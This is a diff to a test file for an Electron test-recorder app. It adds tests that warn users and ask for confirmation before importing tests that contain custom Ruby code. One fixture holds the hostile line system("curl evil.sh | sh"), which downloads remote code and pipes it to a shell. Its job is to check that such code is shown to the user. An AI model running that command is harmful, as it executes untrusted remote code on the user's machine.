@@ -3,10 +3,16 @@ import { mkdtemp, readFile, readdir, rm, writeFile, mkdir } from 'fs/promises'
 import { tmpdir } from 'os'
 import { join } from 'path'
 
-const mockDialog = vi.hoisted(() => ({ showSaveDialog: vi.fn(), showOpenDialog: vi.fn() }))
+const mockDialog = vi.hoisted(() => ({
+  showSaveDialog: vi.fn(),
+  showOpenDialog: vi.fn(),
+  showMessageBox: vi.fn()
+}))
+const mockOpenPath = vi.hoisted(() => vi.fn())
 vi.mock('electron', () => ({
   BrowserWindow: { getFocusedWindow: (): object => ({}) },
-  dialog: mockDialog
+  dialog: mockDialog,
+  shell: { openPath: mockOpenPath }
 }))
 
 import { appState } from '../../src/main/handlers/appState'
@@ -42,6 +48,7 @@ beforeEach(async () => {
   appState.projectFramework = 'rspec'
   appState.recorderSettings = { ...DEFAULT_RECORDER_SETTINGS }
   vi.spyOn(persistence, 'persistActiveSuites').mockResolvedValue()
+  mockDialog.showMessageBox.mockReset().mockResolvedValue({ response: 0 })
 })
 afterEach(async () => {
   vi.restoreAllMocks()
@@ -122,6 +129,153 @@ describe('export then import round trips', () => {
   })
 })
 
+describe('importing custom Ruby code', () => {
+  const custom: Step = { id: 'c', kind: 'custom', code: 'system("curl evil.sh | sh")' }
+  const plain: Step[] = [steps[0], steps[1]]
+
+  const importFile = async (fileSteps: Step[]): Promise<Awaited<ReturnType<typeof importTest>>> => {
+    const file = join(dir, 'shared.rb')
+    await writeFile(file, writeExportHeader({ testName: 'Shared', steps: fileSteps }))
+    appState.suites = new Map([['s1', { id: 's1', name: 'S', tests: [] }]])
+    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [file] })
+    return importTest(win, 's1')
+  }
+
+  it('shows the custom code and imports nothing when the user cancels', async () => {
+    mockDialog.showMessageBox.mockResolvedValue({ response: 1 })
+    const res = await importFile([...plain, custom])
+
+    expect(mockDialog.showMessageBox).toHaveBeenCalledTimes(1)
+    const box = mockDialog.showMessageBox.mock.calls[0][1]
+    expect(box.message).toBe('This test runs custom Ruby code. Import anyway?')
+    expect(box.detail).toContain('system("curl evil.sh | sh")')
+    expect(box.buttons).toEqual(['Import anyway', 'Cancel'])
+    expect(box.cancelId).toBe(1)
+    expect(box.defaultId).toBe(1)
+    expect(res.success).toBe(false)
+    expect(appState.suites.get('s1')!.tests).toEqual([])
+  })
+
+  it('says how much is hidden when the code is long, and can open all of it as text', async () => {
+    const long: Step = {
+      id: 'l',
+      kind: 'custom',
+      code: Array.from({ length: 120 }, (_, i) => `puts ${i}`).join('\n')
+    }
+    mockOpenPath.mockResolvedValue('')
+    mockDialog.showMessageBox
+      .mockResolvedValueOnce({ response: 1 }) // Show all code
+      .mockResolvedValueOnce({ response: 2 }) // Cancel
+    const res = await importFile([long])
+
+    expect(mockDialog.showMessageBox).toHaveBeenCalledTimes(2)
+    const box = mockDialog.showMessageBox.mock.calls[0][1]
+    // the test's name line plus 120 lines of code
+    expect(box.detail).toContain('Showing the first 40 of 121 lines.')
+    expect(box.detail).toContain('puts 38')
+    expect(box.detail).not.toContain('puts 39')
+    expect(box.buttons).toEqual(['Import anyway', 'Show all code', 'Cancel'])
+    expect(box.defaultId).toBe(2)
+    expect(box.cancelId).toBe(2)
+
+    const opened = mockOpenPath.mock.calls[0][0] as string
+    expect(opened.endsWith('.txt')).toBe(true)
+    const text = await readFile(opened, 'utf-8')
+    expect(text).toContain('puts 0')
+    expect(text).toContain('puts 119')
+    await rm(opened, { force: true })
+    expect(res.success).toBe(false)
+  })
+
+  it('cuts very long lines too, so nothing is pushed out of view', async () => {
+    mockDialog.showMessageBox.mockResolvedValue({ response: 2 })
+    await importFile([
+      { id: 'w', kind: 'custom', code: `x = '${'a'.repeat(10_000)}'\nsystem('id')` }
+    ])
+    const box = mockDialog.showMessageBox.mock.calls[0][1]
+    expect(box.detail.length).toBeLessThan(5000)
+    expect(box.detail).toMatch(/Showing the first \d+ of 3 lines\./)
+    expect(box.buttons).toContain('Show all code')
+  })
+
+  it('imports when the user confirms', async () => {
+    const res = await importFile([...plain, custom])
+    expect(res.success).toBe(true)
+    expect(res.test!.steps.at(-1)).toMatchObject({ kind: 'custom', code: custom.code })
+  })
+
+  it('refuses a file whose secret step reads a variable other than RAIDER_SECRET_', async () => {
+    const bad = {
+      id: 'p',
+      kind: 'type',
+      element: { strategy: 'id', value: 'pw' },
+      text: '',
+      secret: true,
+      secretName: 'GITHUB_TOKEN'
+    } as Step
+    const res = await importFile([...plain, bad])
+    expect(res.success).toBe(false)
+    expect(res.error).toContain('GITHUB_TOKEN')
+    expect(res.error).toContain('RAIDER_SECRET_')
+    expect(appState.suites.get('s1')!.tests).toEqual([])
+  })
+
+  it('does not ask when the file holds no custom steps', async () => {
+    const res = await importFile(plain)
+    expect(res.success).toBe(true)
+    expect(mockDialog.showMessageBox).not.toHaveBeenCalled()
+  })
+
+  it('asks once for a suite, listing each test that runs custom code', async () => {
+    const suiteDir = join(dir, 'shared-suite')
+    await mkdir(suiteDir)
+    await writeFile(join(suiteDir, 'a.rb'), writeExportHeader({ testName: 'A', steps: [custom] }))
+    await writeFile(join(suiteDir, 'b.rb'), writeExportHeader({ testName: 'B', steps: plain }))
+    await writeFile(
+      join(suiteDir, 'c.rb'),
+      writeExportHeader({ testName: 'C', steps: [{ id: 'c2', kind: 'custom', code: 'puts 2' }] })
+    )
+    mockDialog.showMessageBox.mockResolvedValue({ response: 1 })
+    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [suiteDir] })
+
+    const res = await importSuite(win)
+
+    expect(mockDialog.showMessageBox).toHaveBeenCalledTimes(1)
+    const box = mockDialog.showMessageBox.mock.calls[0][1]
+    expect(box.message).toBe('These tests run custom Ruby code. Import anyway?')
+    expect(box.detail).toContain('A:')
+    expect(box.detail).toContain('C:')
+    expect(box.detail).not.toContain('B:')
+    expect(res.success).toBe(false)
+    expect(appState.suites.size).toBe(0)
+  })
+
+  // The user picks a file in a dialog and never sees its body, so every source of
+  // custom code asks: a legacy body, and a missing or broken steps line
+  it.each([
+    [
+      'a legacy file',
+      '# Test: Old\nbegin\n  some_helper(1)\n  puts "Test \'Old\' passed successfully!"\n'
+    ],
+    [
+      'a broken steps line',
+      '# Test: Old\n# raider-steps: [{nope\nbegin\n  some_helper(1)\n  puts "Test \'Old\' passed successfully!"\n'
+    ]
+  ])('asks before importing custom Ruby from %s', async (_label, body) => {
+    const file = join(dir, 'old.rb')
+    await writeFile(file, body)
+    appState.suites = new Map([['s1', { id: 's1', name: 'S', tests: [] }]])
+    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [file] })
+    mockDialog.showMessageBox.mockResolvedValue({ response: 1 })
+
+    const res = await importTest(win, 's1')
+
+    expect(mockDialog.showMessageBox.mock.calls[0][1].detail).toContain('some_helper(1)')
+    expect(res.success).toBe(false)
+    expect(appState.suites.get('s1')!.tests).toEqual([])
+  })
+})
+
 describe('readExportHeader', () => {
   it('falls back to the legacy body when the steps JSON is malformed', () => {
     const text =
@@ -137,6 +291,12 @@ describe('readExportHeader', () => {
     expect(readExportHeader('# raider-steps: {nope').steps).toBeUndefined()
   })
 
+  it('names unnamed secret steps from the JSON line', () => {
+    const pw = { strategy: 'id', value: 'pw' }
+    const line = `# raider-steps: ${JSON.stringify([{ id: 'a', kind: 'type', element: pw, text: '', secret: true }])}`
+    expect(readExportHeader(line).steps).toMatchObject([{ id: 'a', secretName: 'RAIDER_SECRET_1' }])
+  })
+
   it('keeps only valid steps from the JSON line', () => {
     const line = `# raider-steps: ${JSON.stringify([steps[0], { id: 'z', kind: 'click' }, 'x'])}`
     expect(readExportHeader(line).steps).toEqual([steps[0]])
@@ -144,6 +304,10 @@ describe('readExportHeader', () => {
 
   it('keeps names on one line', () => {
     const header = writeExportHeader({ testName: 'a\nb', suiteName: 'c\r\nd', steps: [] })
-    expect(readExportHeader(header)).toEqual({ testName: 'a b', suiteName: 'c d', steps: [] })
+    expect(readExportHeader(header)).toEqual({
+      testName: 'a b',
+      suiteName: 'c d',
+      steps: []
+    })
   })
 })
